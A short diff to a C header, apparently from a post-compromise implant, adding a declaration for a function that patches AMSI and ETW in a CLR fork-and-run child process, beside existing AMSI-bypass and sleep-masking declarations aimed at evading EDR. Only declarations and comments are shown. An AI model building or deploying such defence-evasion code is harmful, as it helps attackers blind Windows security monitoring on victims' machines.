@@ -11,6 +11,10 @@ void evasion_init(void);
 /* Re-apply AMSI + ETW patches post-compromise (if EDR restored them) */
 void amsi_bypass(void);
 
+/* Unconditionally patch AMSI+ETW in the CLR fork-and-run child process.
+ * Must be called before ICorRuntimeHost loads any .NET assembly. */
+void clr_amsi_init(void);
+
 /* Sleeps via NtDelayExecution; optionally masks registered external regions.
  * Runs from .evasn — never touches the agent's own .text.
  * Masking is skipped while any conn_thread is active (g_conn_thread_count > 0). */
